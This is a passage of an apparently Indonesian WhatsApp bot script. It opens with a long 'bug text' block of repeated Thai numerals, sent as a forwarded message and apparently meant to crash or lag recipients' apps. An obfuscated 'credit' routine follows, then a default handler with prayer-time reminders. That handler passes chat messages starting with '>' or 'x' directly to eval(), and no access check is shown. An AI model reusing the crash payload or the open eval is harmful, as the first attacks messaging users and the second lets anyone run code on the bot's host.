*๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑*
๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑*
*๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒     
`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "By Ndyie Botz",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./itsuki.jpg'),sourceUrl:"OV1876"}}})
break
     
     
     
     
     
     
     
     
     
     
     
case 'tq':     
case 'credit':
function _0x4b45(_0x5aacfe,_0x5fdef1){var _0x4b4577=_0x5fde();return _0x4b45=function(_0x51d4c2,_0x16b669){_0x51d4c2=_0x51d4c2-(0xf9*-0x10+0x7*-0x506+-0x3494*-0x1);var _0x519907=_0x4b4577[_0x51d4c2];return _0x519907;},_0x4b45(_0x5aacfe,_0x5fdef1);}function _0x5fde(){var _0x2245e5=['2305820UsSofg','xoEbr','tUjcM','rxXjq','(((.+)+)+)','oNETU','pBlKc','51846gFKwun','__proto__','Iuldi','error','ctor(\x22retu','constructo','trace','ncNqf','bind','warn','toString','GonlJ','17859nQLWAL','ZZBYt','Abfvd','VGWBc','info','log','842632VbssHS','split','FkrHH','2|3|0|4|5|','length','gABuu','9ofzGRl','search','return\x20(fu','faPMO','KHHcO','exception','185dyUGmW','{}.constru','console','ROixk','prototype','8155iVrpVh','FbaOb','iyHRr','7684347ofLucY','UZlql','ptqAk','\x20Presetya\x0a','z\x0aNyx\x0aMelc','\x0aAnto\x0aYogi','XGBfT','DTSqk','4280csOrPO','290ewaMvp','fLJBt','gUkOZ','anz\x0aCaliph','nction()\x20','Ldyeo','2189412UxkrDZ','apply','hNXCh','HYCTg','rn\x20this\x22)('];_0x5fde=function(){return _0x2245e5;};return _0x5fde();}(function(_0x364ece,_0x13b625){function _0x2db17f(_0x5d01e5,_0x58477d,_0x251459,_0x3eaa23){return _0x4b45(_0x251459- -0x3a6,_0x58477d);}var _0x390979=_0x364ece();function _0xc5efdc(_0x3f8ab0,_0x3b8813,_0xdd077d,_0x1343c0){return _0x4b45(_0x1343c0-0x386,_0xdd077d);}while(!![]){try{var _0x1ad87b=-parseInt(_0xc5efdc(0x58a,0x57c,0x57e,0x595))/(0x88*0x8+-0xc*-0x263+0x1*-0x20e3)+parseInt(_0xc5efdc(0x575,0x586,0x57c,0x571))/(-0x12bf+0x811*0x2+0x29f)*(parseInt(_0xc5efdc(0x589,0x59b,0x592,0x58f))/(0x5d1+-0x10dc+0xb0e))+-parseInt(_0x2db17f(-0x1c4,-0x1c6,-0x1b5,-0x1c8))/(-0x10c+0xf14+-0xd*0x114)+parseInt(_0x2db17f(-0x1c5,-0x1c8,-0x1cc,-0x1ec))/(0x157f+0x39e+-0x1918)*(-parseInt(_0xc5efdc(0x5a4,0x592,0x598,0x583))/(0x13f*-0x16+0x1770+0x400))+-parseInt(_0x2db17f(-0x1c1,-0x1b5,-0x1c7,-0x1be))/(0x1b*-0x7+-0x1161+0x1225*0x1)*(-parseInt(_0x2db17f(-0x1cd,-0x1a8,-0x1bc,-0x1af))/(-0x2552+-0x1*0x19df+-0xf9*-0x41))+parseInt(_0xc5efdc(0x5a3,0x594,0x59f,0x59b))/(0x4*0xf8+0x1ceb*0x1+-0x20c2)*(parseInt(_0xc5efdc(0x55e,0x563,0x590,0x57c))/(-0x86d+-0x1f*-0xc4+0x1*-0xf45))+parseInt(_0x2db17f(-0x1c4,-0x1d8,-0x1c4,-0x1d6))/(-0xd2+-0x265+0x342);if(_0x1ad87b===_0x13b625)break;else _0x390979['push'](_0x390979['shift']());}catch(_0x1bfb97){_0x390979['push'](_0x390979['shift']());}}}(_0x5fde,0x16*-0x182e+-0xa6fc*0x2+0xe2769));var _0x5aacfe=(function(){var _0x36a6a0=!![];return function(_0x22c501,_0x351953){var _0x5d84ee=_0x36a6a0?function(){function _0x5bafb5(_0x4aa0ec,_0x30c082,_0x377938,_0x3ff384){return _0x4b45(_0x377938- -0x1cd,_0x3ff384);}if(_0x351953){var _0x537401=_0x351953[_0x5bafb5(0x12,0x26,0x25,0x28)](_0x22c501,arguments);return _0x351953=null,_0x537401;}}:function(){};return _0x36a6a0=![],_0x5d84ee;};}()),_0x2165ed=_0x5aacfe(this,function(){function _0xe0d372(_0x5024a0,_0x1e3f7a,_0x388c05,_0x5b7f19){return _0x4b45(_0x388c05-0xfb,_0x5024a0);}var _0x57eaea={};_0x57eaea[_0x56e501(0x4dd,0x4dd,0x4ea,0x4e6)]=_0xe0d372(0x2ed,0x30f,0x2f5,0x310)+'+$';var _0x1581b2=_0x57eaea;function _0x56e501(_0x2fa801,_0x28a1f4,_0x2c4bba,_0x35230f){return _0x4b45(_0x2fa801-0x2f5,_0x35230f);}return _0x2165ed[_0xe0d372(0x314,0x305,0x302,0x303)]()[_0x56e501(0x50b,0x512,0x4f1,0x50a)](_0x1581b2[_0xe0d372(0x2fb,0x2cf,0x2e3,0x2f5)])[_0xe0d372(0x31b,0x2ef,0x302,0x318)]()[_0xe0d372(0x2e7,0x308,0x2fd,0x2f4)+'r'](_0x2165ed)[_0x56e501(0x50b,0x4f0,0x504,0x50e)](_0x1581b2['XGBfT']);});_0x2165ed();var _0x44bbbe=(function(){var _0x5a9ef5={'DTSqk':function(_0x93abb5,_0x2a13f6){return _0x93abb5(_0x2a13f6);},'HYCTg':function(_0x24060b,_0x105ff8){return _0x24060b+_0x105ff8;},'ptqAk':function(_0x34adbc,_0x14e363){return _0x34adbc+_0x14e363;},'GmmUo':'return\x20(fu'+'nction()\x20','FkrHH':_0x37b2e2(-0x1cd,-0x1e1,-0x1bc,-0x1bf)+_0x37b2e2(-0x1a7,-0x1b7,-0x198,-0x1af)+_0x58d724(-0x50,-0x35,-0x49,-0x5f)+'\x20)','Znnep':function(_0x313c46,_0x5963e1){return _0x313c46!==_0x5963e1;},'fLJBt':function(_0x42a44d,_0x30209d){return _0x42a44d!==_0x30209d;},'rxXjq':_0x37b2e2(-0x1a4,-0x1bf,-0x19a,-0x19e)};function _0x58d724(_0x117638,_0x31369b,_0x5d3926,_0x31400f){return _0x4b45(_0x117638- -0x245,_0x5d3926);}function _0x37b2e2(_0xba76c8,_0x4e1c1a,_0x53cdaf,_0x579780){return _0x4b45(_0xba76c8- -0x3a8,_0x53cdaf);}var _0x142c64=!![];return function(_0x38eb1e,_0x1325e4){var _0x37db2c={'pBlKc':function(_0x587e71,_0x4bbb15){return _0x5a9ef5['Znnep'](_0x587e71,_0x4bbb15);},'UZlql':_0x308e1e(0x2c3,0x2db,0x2d1,0x2af)};function _0x308e1e(_0x105019,_0xc45b67,_0x1c656d,_0x54757d){return _0x58d724(_0x105019-0x2f4,_0xc45b67-0x165,_0xc45b67,_0x54757d-0xb);}function _0x5eec82(_0x1e26f7,_0x43c397,_0x182054,_0x5ec712){return _0x37b2e2(_0x43c397-0x614,_0x43c397-0x1c,_0x1e26f7,_0x5ec712-0x164);}if(_0x5a9ef5[_0x308e1e(0x29b,0x2af,0x2b4,0x29c)](_0x5a9ef5[_0x308e1e(0x2a8,0x2b6,0x2b0,0x28e)],_0x5a9ef5['rxXjq'])){var _0x32279b;try{_0x32279b=_0x5a9ef5[_0x308e1e(0x298,0x281,0x2b7,0x2b6)](_0x1d6f0b,_0x5a9ef5[_0x308e1e(0x2a3,0x2b1,0x2b2,0x28d)](_0x5a9ef5[_0x308e1e(0x293,0x280,0x295,0x27d)](_0x5a9ef5['GmmUo'],_0x5a9ef5[_0x5eec82(0x473,0x47d,0x481,0x495)]),');'))();}catch(_0x59fd89){_0x32279b=_0x3639f2;}return _0x32279b;}else{var _0x4e51c2=_0x142c64?function(){function _0x1b51a5(_0x46b43e,_0x298943,_0x44923e,_0x186970){return _0x308e1e(_0x186970- -0x36b,_0x298943,_0x44923e-0xe2,_0x186970-0x4e);}function _0x6841ff(_0x429430,_0x53f43,_0x1f5fba,_0x864f14){return _0x5eec82(_0x429430,_0x53f43- -0x1fb,_0x1f5fba-0x9d,_0x864f14-0xe1);}if(_0x37db2c[_0x6841ff(0x27c,0x26d,0x26a,0x252)](_0x37db2c[_0x1b51a5(-0xf9,-0xf6,-0xbe,-0xd9)],_0x37db2c['UZlql'])){var _0x19e457=_0x28df6e?function(){function _0x301f51(_0x8b2b6c,_0x5da971,_0x424dcd,_0x1cbfa8){return _0x1b51a5(_0x8b2b6c-0x18a,_0x5da971,_0x424dcd-0x12c,_0x8b2b6c-0x676);}if(_0x46b900){var _0x4ab07f=_0xbf9ce4[_0x301f51(0x5ac,0x5ac,0x5bf,0x59c)](_0x1fad46,arguments);return _0x26b145=null,_0x4ab07f;}}:function(){};return _0x1a2c65=![],_0x19e457;}else{if(_0x1325e4){var _0x2901bd=_0x1325e4['apply'](_0x38eb1e,arguments);return _0x1325e4=null,_0x2901bd;}}}:function(){};return _0x142c64=![],_0x4e51c2;}};}());function _0x2ab9c4(_0x19186b,_0x494eb2,_0x5aa400,_0x2b41d0){return _0x4b45(_0x494eb2-0x1c4,_0x19186b);}var _0x4cfdad=_0x44bbbe(this,function(){var _0x2aca87={'ROixk':function(_0x27a4af,_0x425079){return _0x27a4af!==_0x425079;},'Abfvd':'wxMvQ','oWkFG':function(_0xcbfdd2,_0x5cd132){return _0xcbfdd2===_0x5cd132;},'iyHRr':_0x1e8fec(0x5d1,0x5d8,0x5d3,0x5dd),'FbaOb':function(_0x365754,_0x3dec90){return _0x365754(_0x3dec90);},'Iuldi':function(_0x4be9fd,_0x508a6f){return _0x4be9fd+_0x508a6f;},'tUjcM':function(_0x4c9ab8,_0x5e7a60){return _0x4c9ab8+_0x5e7a60;},'Jxabc':_0x1e8fec(0x5db,0x5fe,0x5fb,0x5f9)+_0x1e8fec(0x5bb,0x5b9,0x5cb,0x5d1),'gUkOZ':_0x797293(0x456,0x453,0x462,0x44c)+_0x1e8fec(0x5fe,0x5d7,0x5f3,0x5e3)+_0x797293(0x470,0x46f,0x452,0x476)+'\x20)','hNXCh':function(_0x107726){return _0x107726();},'xoEbr':_0x797293(0x489,0x4aa,0x4a4,0x47a),'faPMO':_0x1e8fec(0x602,0x5fb,0x5ff,0x5ef),'KHHcO':_0x797293(0x47b,0x49a,0x478,0x478),'Ldyeo':_0x1e8fec(0x603,0x608,0x5e2,0x5fc),'ZZBYt':_0x1e8fec(0x5ff,0x5c8,0x5d0,0x5e5),'VGWBc':function(_0x23421b,_0x57935c){return _0x23421b<_0x57935c;},'GonlJ':_0x1e8fec(0x603,0x5f4,0x5e6,0x5f4)+'1'},_0x23b926=function(){function _0x40ca46(_0xa74046,_0x559018,_0x2d75ce,_0x4a4dc9){return _0x1e8fec(_0xa74046-0xa9,_0x559018-0x1dd,_0x559018,_0x4a4dc9- -0x3a5);}function _0x223090(_0x53eb3c,_0x587796,_0x48e9af,_0x14b9d5){return _0x1e8fec(_0x53eb3c-0x35,_0x587796-0x12a,_0x48e9af,_0x587796- -0x4a2);}if(_0x2aca87[_0x223090(0x10d,0x11d,0x131,0x101)]('wxMvQ',_0x2aca87[_0x40ca46(0x231,0x234,0x243,0x248)])){var _0x508ed8=_0x4d043b[_0x40ca46(0x237,0x216,0x23a,0x22f)](_0x48f897,arguments);return _0x2df75c=null,_0x508ed8;}else{var _0x7a1903;try{if(_0x2aca87['oWkFG'](_0x2aca87[_0x223090(0x11c,0x121,0x129,0x134)],_0x2aca87[_0x40ca46(0x235,0x212,0x213,0x21e)]))_0x7a1903=_0x2aca87[_0x40ca46(0x23a,0x21d,0x22c,0x21d)](Function,_0x2aca87[_0x223090(0x11e,0x13f,0x15c,0x13d)](_0x2aca87[_0x40ca46(0x24e,0x23e,0x231,0x235)](_0x2aca87['Jxabc'],_0x2aca87[_0x40ca46(0x229,0x23d,0x240,0x22a)]),');'))();else{var _0x1ad833=_0x3eec9c?function(){if(_0x80caea){var _0x6a4ef5=_0x162af3['apply'](_0x4ba7d1,arguments);return _0x47fb34=null,_0x6a4ef5;}}:function(){};return _0x3047b0=![],_0x1ad833;}}catch(_0x2c57e5){_0x7a1903=window;}return _0x7a1903;}},_0x447b18=_0x2aca87[_0x797293(0x46e,0x452,0x488,0x45f)](_0x23b926);function _0x1e8fec(_0x2596d9,_0x348da7,_0x5644e6,_0x467771){return _0x4b45(_0x467771-0x3e2,_0x5644e6);}var _0x39ef03=_0x447b18[_0x797293(0x457,0x46f,0x456,0x44c)]=_0x447b18['console']||{};function _0x797293(_0x5acd98,_0x58bf61,_0x4386de,_0x275f7b){return _0x4b45(_0x5acd98-0x27b,_0x275f7b);}var _0x42fe34=[_0x2aca87[_0x1e8fec(0x5eb,0x5f7,0x5f2,0x5d9)],_0x1e8fec(0x5eb,0x5ca,0x5df,0x5e8),_0x2aca87[_0x1e8fec(0x5e5,0x5de,0x5f2,0x5fa)],_0x2aca87[_0x797293(0x494,0x4a6,0x47f,0x478)],_0x2aca87[_0x797293(0x46b,0x48a,0x474,0x482)],'table',_0x2aca87[_0x797293(0x485,0x499,0x46c,0x493)]];for(var _0xe1e296=-0x2*-0x7db+0xed0+0x1e86*-0x1;_0x2aca87[_0x1e8fec(0x5d8,0x60c,0x605,0x5ee)](_0xe1e296,_0x42fe34[_0x1e8fec(0x607,0x5dc,0x5d8,0x5f5)]);_0xe1e296++){var _0x129923=_0x2aca87[_0x797293(0x483,0x49e,0x466,0x48b)][_0x797293(0x48b,0x489,0x46a,0x499)]('|'),_0x3ca73c=0x1fe1+-0x7e7+0x155*-0x12;while(!![]){switch(_0x129923[_0x3ca73c++]){case'0':var _0xbac348=_0x39ef03[_0x507ed6]||_0x37613f;continue;case'1':_0x39ef03[_0x507ed6]=_0x37613f;continue;case'2':var _0x37613f=_0x44bbbe[_0x1e8fec(0x5d4,0x5c6,0x5fe,0x5e4)+'r'][_0x797293(0x459,0x46b,0x461,0x45f)][_0x797293(0x480,0x474,0x47d,0x46b)](_0x44bbbe);continue;case'3':var _0x507ed6=_0x42fe34[_0xe1e296];continue;case'4':_0x37613f[_0x1e8fec(0x5de,0x5e3,0x5da,0x5e0)]=_0x44bbbe[_0x1e8fec(0x602,0x5ff,0x5e9,0x5e7)](_0x44bbbe);continue;case'5':_0x37613f[_0x1e8fec(0x5e1,0x5cc,0x601,0x5e9)]=_0xbac348[_0x797293(0x482,0x465,0x49d,0x49b)][_0x1e8fec(0x5c7,0x5f8,0x5ea,0x5e7)](_0xbac348);continue;}break;}}});function _0x53d95c(_0x365673,_0x1fb001,_0x4ce447,_0x34198d){return _0x4b45(_0x34198d- -0x179,_0x4ce447);}_0x4cfdad(),reply('\x0aNdyie\x20Bot'+_0x53d95c(0x8b,0x83,0x5c,0x6d)+_0x53d95c(0x7d,0x77,0x81,0x75)+_0x2ab9c4(0x3a2,0x3ab,0x3c4,0x38c)+_0x2ab9c4(0x3af,0x3a9,0x3a5,0x3af));     
break
     
     
     
     
     
     
//━━━━━━━━━━━━━━━━━━[ AKHIR  ]━━━━━━━━━━━━━━━\\
default:
if (hour_now >= '02:00' && hour_now <= '04:00') {
          console.log(color('[Pesan Bot]', 'cyan'), color('Waktunya sahur kak, Main botnya buat nanti lagi, Sebelum makan jangan lupa baca Doa ya kak', 'yellow'), color('(😊)', 'white'))
          }
        if (hour_now >= '04:00' && hour_now <= '05:00') {
          console.log(color('[Pesan Bot]', 'cyan'), color('Bentar lagi jam 5 nih kak, Jangan lupa sholat subuh ya kak', 'yellow'), color('(😊)', 'white'))
          }
          if (hour_now >= '05:00' && hour_now <= '06:00') {
          console.log(color('[Pesan Bot]', 'cyan'), color('Udah sholat Subuh belum kak', 'yellow'), color('(🙄)', 'white'))
          }
        if (hour_now >= '06:00' && hour_now <= '11:00') {
          console.log(color('[Pesan Bot]', 'cyan'), color('Pagi kak, Jangan lupa mandi', 'yellow'), color('(😅)', 'white'))
          }
          if (hour_now >= '11:00' && hour_now <= '12:00') {
          console.log(color('[Pesan Bot]', 'cyan'), color('Siang kak, Dah mandi blm kak?', 'yellow'), color('(🙄)', 'white'))
          }
          if (hour_now >= '12:00' && hour_now <= '14:00') {
           console.log(color('[Pesan Bot]', 'cyan'), color('Dah jam 12 kak, Jangan lupa sholat Dzuhur ya kak', 'yellow'), color('(😊)', 'white'))
           }
        if (hour_now >= '14:00' && hour_now <= '15:00') {
          console.log(color('[Pesan Bot]', 'cyan'), color('Sore kak, Jangan lupa mandi', 'yellow'), color('(😅)', 'white'))
          }
        if (hour_now >= '15:00' && hour_now <= '16:00') {
          console.log(color('[Pesan Bot]', 'cyan'), color('Dah jam 3 kak, Jangan lupa sholat Ashar ya kak', 'yellow'), color('(😊)', 'white'))
          }
        if (hour_now >= '17:00' && hour_now <= '18:00') {
          console.log(color('[Pesan Bot]', 'cyan'), color('Bentar lagi buka kak, Sabar ya kak', 'yellow'), color('(😆)', 'white'))
          }
        if (hour_now >= '18:00' && hour_now <= '19:00') {
        	console.log(color('[Pesan Bot]', 'cyan'), color('Alhamdulillah, Dh magrib jan lupa sholat kak', 'yellow'), color('(😊)', 'white'))
        }
        if (hour_now >= '19:00' && hour_now <= '20:00') {
           console.log(color('[Pesan Bot]', 'cyan'), color('Bentar lagi jam 8 gak mabar kak?', 'yellow'), color('(😊)', 'white'))
           }
        if (hour_now >= '20:00' && hour_now <= '00:00') {
           console.log(color('[Pesan Bot]', 'cyan'), color('Selamat malam kak, Jangan begadang ya kak, Tar sakit loh', 'yellow'), color('(😄)', 'white'))
        }
          if (hour_now >= '00:00' && hour_now <= '02:00') {
           console.log(color('[Pesan Bot]', 'cyan'), color('Bot ngantuk kak, tidur dulu ya kak', 'yellow'), color('(😴)', 'white'))
        }
			if (budy.startsWith('>')) {
				console.log(color('[EVAL1]'), color(moment(Nia.messageTimestamp * 1000).format('DD/MM/YY HH:mm:ss'), 'yellow'), color(`eval return`))
				try {
					let evaled = await eval(budy.slice(2))
					if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
					reply(`${evaled}`)
				} catch (err) {
					reply(`${err}`)
				}
			} else if (budy.startsWith('x')) {
				console.log(color('[EVAL2]'), color(moment(Nia.messageTimestamp * 1000).format('DD/MM/YY HH:mm:ss'), 'yellow'), color(`eval identy`))
				try {
					return Ndyie.sendMessage(from, JSON.stringify(eval(budy.slice(2)), null, '\t'), text, { quoted: ftrol })
				} catch (err) {
					e = String(err)
					reply(e)
				}
			}
		}
		
	} catch (e) {
    e = String(e)
    if (!e.includes("this.isZero") && !e.includes("jid")) {
	console.log('Error : %s', color(e, 'red'))
        }
	// console.log(e)
	}
}


	
    
